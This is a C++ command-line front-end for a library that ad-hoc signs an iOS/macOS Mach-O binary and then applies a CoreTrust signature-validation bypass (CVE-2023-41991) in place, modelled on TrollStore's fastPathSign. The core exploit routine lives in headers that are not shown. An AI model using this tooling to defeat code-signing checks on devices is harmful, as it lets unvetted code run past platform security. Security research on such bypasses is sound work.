// Command-line front-end for the ct_bypass library.
//
// It mirrors TrollStore's fastPathSign: ad-hoc sign the input, then apply the
// CoreTrust bypass (CVE-2023-41991) to it, editing the file in place. The
// library selects and extracts the arm64 slice of a universal binary itself,
// so no temporary-file juggling is needed here.

#include <CoreFoundation/CoreFoundation.h>
#include <cxxopts.hpp>

#include <cstdint>
#include <cstdio>
#include <fstream>
#include <iterator>
#include <string>
#include <vector>

#include "cf_ptr.h"
#include "exploit/ad_hoc_signer.h"
#include "exploit/coretrust_bypass.h"
#include "exploit/return_code.h"

#ifndef CT_BYPASS_VERSION
#define CT_BYPASS_VERSION "unknown"
#endif

namespace {

using ct_bypass::CFPtr;
using ct_bypass::ReturnCode;

// Exit codes: success, a usage/input error, or a failed operation.
enum ExitCode { kExitOk = 0, kExitUsage = 1, kExitFailed = 2 };

// Reads a plist file (XML or binary) into a CFDictionary, or null on failure.
CFPtr<CFDictionaryRef> load_entitlements(const std::string& path) {
  std::ifstream file(path, std::ios::binary);
  if (!file) {
    fprintf(stderr, "Error: cannot open entitlements file %s\n", path.c_str());
    return nullptr;
  }
  std::vector<UInt8> bytes((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());

  CFPtr<CFDataRef> data(CFDataCreate(kCFAllocatorDefault, bytes.data(),
                                     static_cast<CFIndex>(bytes.size())));
  if (!data) return nullptr;

  CFPtr<CFPropertyListRef> plist(CFPropertyListCreateWithData(
      kCFAllocatorDefault, data.get(), kCFPropertyListImmutable, nullptr,
      nullptr));
  if (!plist || CFGetTypeID(plist.get()) != CFDictionaryGetTypeID()) {
    fprintf(stderr, "Error: %s is not a property-list dictionary\n",
            path.c_str());
    return nullptr;
  }
  return CFPtr<CFDictionaryRef>(
      static_cast<CFDictionaryRef>(plist.release()));
}

}  // namespace

int main(int argc, char** argv) {
  cxxopts::Options options(
      "ct_bypass",
      "Ad-hoc sign a Mach-O and apply the CoreTrust bypass (CVE-2023-41991), "
      "editing the file in place.\nA universal binary is replaced by its "
      "re-signed arm64 slice.");
  options.add_options()
      ("e,entitlements",
       "Entitlements plist to embed while ad-hoc signing",
       cxxopts::value<std::string>(), "<file>")
      ("no-adhoc", "Skip ad-hoc signing and bypass the binary as-is")
      ("h,help", "Show this help and exit")
      ("v,version", "Show the version and exit")
      ("input", "Mach-O binary to re-sign",
       cxxopts::value<std::string>());
  options.parse_positional({"input"});
  options.positional_help("<binary>");

  cxxopts::ParseResult args;
  try {
    args = options.parse(argc, argv);
  } catch (const cxxopts::exceptions::exception& e) {
    fprintf(stderr, "Error: %s\n", e.what());
    fprintf(stderr, "%s", options.help().c_str());
    return kExitUsage;
  }

  if (args.count("help")) {
    printf("%s", options.help().c_str());
    return kExitOk;
  }
  if (args.count("version")) {
    printf("ct_bypass %s\n", CT_BYPASS_VERSION);
    return kExitOk;
  }
  if (!args.count("input")) {
    fprintf(stderr, "Error: no input binary given\n");
    fprintf(stderr, "%s", options.help().c_str());
    return kExitUsage;
  }

  const std::string input = args["input"].as<std::string>();

  CFPtr<CFDictionaryRef> entitlements;
  if (args.count("entitlements")) {
    entitlements = load_entitlements(args["entitlements"].as<std::string>());
    if (!entitlements) return kExitUsage;
  }

  if (!args.count("no-adhoc")) {
    printf("Ad-hoc signing %s...\n", input.c_str());
    ReturnCode rc = ct_bypass::AdHocSigner::create(
                        input, /*preserve_metadata=*/true, entitlements.get())
                        ->sign();
    if (failed(rc)) {
      // As in fastPathSign: an existing signature may still be enough, so the
      // bypass is attempted regardless.
      fprintf(stderr, "Warning: ad-hoc signing failed (%d); continuing\n",
              static_cast<int>(rc));
    }
  }

  printf("Applying CoreTrust bypass to %s...\n", input.c_str());
  ReturnCode rc = ct_bypass::CoreTrustBypass::create(input)->bypass();
  if (failed(rc)) {
    fprintf(stderr, "Error: CoreTrust bypass failed (%d)\n",
            static_cast<int>(rc));
    return kExitFailed;
  }
  return kExitOk;
}
